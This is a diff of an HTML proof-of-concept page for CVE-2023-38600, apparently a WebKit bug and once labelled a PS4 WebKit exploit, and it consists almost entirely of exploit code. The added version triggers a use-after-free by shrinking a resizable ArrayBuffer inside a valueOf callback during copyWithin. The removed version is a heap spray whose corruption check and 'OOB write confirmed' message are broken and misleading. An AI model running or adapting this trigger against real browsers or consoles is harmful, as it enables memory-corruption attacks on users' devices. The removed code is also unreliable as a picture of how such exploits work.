@@ -2,83 +2,40 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PS4 WebKit Exploit - CVE-2023-38600</title>
+  <title>CVE-2023-38600 PoC</title>
   <style>
-    body {
-      font-family: monospace;
-      background: #111;
-      color: #0f0;
-      padding: 20px;
-    }
-    button {
-      background: #222;
-      color: #0f0;
-      border: 1px solid #0f0;
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    button:hover {
-      background: #0f0;
-      color: #111;
-    }
+    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+    button { background: #222; color: #0f0; padding: 10px 20px; font-size: 16px; cursor: pointer; border: 1px solid #0f0; }
+    button:hover { background: #0f0; color: #111; }
   </style>
 </head>
 <body>
-  <h1>PS4 WebKit Exploit PoC - CVE-2023-38600</h1>
-  <button onclick="runExploit()">Run Exploit</button>
-  <div id="log" style="margin-top: 20px;"></div>
+  <h1>CVE-2023-38600 - WebKit UAF</h1>
+  <button onclick="trigger()">Trigger Exploit</button>
+  <pre id="log"></pre>
 
   <script>
     function log(msg) {
-      let div = document.createElement("div");
-      div.textContent = msg;
-      document.getElementById("log").appendChild(div);
+      document.getElementById('log').textContent += msg + "\n";
     }
 
-    function runExploit() {
-      log("[*] Exploit started");
+    function trigger() {
+      log("[*] Starting CVE-2023-38600 test...");
 
-      let victimBuffers = [];
-      let victimViews = [];
-      for (let i = 0; i < 1000; i++) {
-        let buf = new ArrayBuffer(0x100);
-        let view = new Float64Array(buf);
-        view[0] = 13.37;
-        victimBuffers.push(buf);
-        victimViews.push(view);
-      }
-      log("[+] Heap prepared");
+      const ab = new ArrayBuffer(0x1000, { maxByteLength: 0x4000 });
+      const u8 = new Uint8Array(ab);
 
-      let corruptor = new Float64Array(10);
+      const callback = () => {
+        ab.resize(0);
+        log("[*] Buffer resized to 0 inside valueOf()");
+        return 0;
+      };
 
       try {
-        corruptor.copyWithin(0, 100);
-        log("[+] copyWithin executed");
+        u8.copyWithin(0x20, { valueOf: callback });
+        log("[+] copyWithin executed (check debugger or crash handler)");
       } catch (e) {
-        log("[-] copyWithin failed: " + e);
-        return;
-      }
-
-      let corruptedIndex = -1;
-      for (let i = 0; i < victimViews.length; i++) {
-        if (victimViews[i][0] !== 13.37) {
-          corruptedIndex = i;
-          log("[!] Corrupted object found at index: " + i);
-          break;
-        }
-      }
-
-      if (corruptedIndex === -1) {
-        log("[-] No corrupted object found. Try again.");
-      } else {
-        let corrupted = victimViews[corruptedIndex];
-        corrupted[0] = 42.42;
-        if (corrupted[0] === 42.42) {
-          log("[+] OOB write confirmed");
-        } else {
-          log("[-] Corrupted object is not writable");
-        }
+        log("[-] Exception: " + e);
       }
     }
   </script>
